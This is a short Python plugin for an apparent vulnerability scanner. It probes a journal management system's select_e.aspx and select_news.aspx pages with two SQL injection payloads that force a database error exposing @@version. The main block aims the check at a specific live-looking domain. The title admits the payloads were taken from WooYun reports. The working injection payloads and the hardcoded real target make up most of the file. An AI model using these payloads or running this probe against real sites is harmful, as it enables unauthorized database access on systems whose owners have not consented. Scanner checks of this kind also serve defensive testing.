#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:菲斯特诺期刊系统最后2枚注入打包（偷的）
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0125186，http://www.wooyun.org/bugs/wooyun-2010-0116361


def assign(service,arg):
    if service=="newedos":
        return True,arg 
    


def  audit(arg):
    ps=[
        "select_e.aspx?type=zzdw&content=1%27%20and%20char(char(74)%2Bchar(73)%2B@@version)<0--",
        "select_news.aspx?type=1&content=1/**//'/**/and/**/char(char(74)%2Bchar(73)%2B@@version)/**/>0",
       
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        
        
        if code==500 and "JIMicrosoft" in res:
            security_hole('SQL injection:'+url)  

if __name__=="__main__":
    from dummy import *
    audit(assign('newedos','http://www.scdwzz.com/')[1])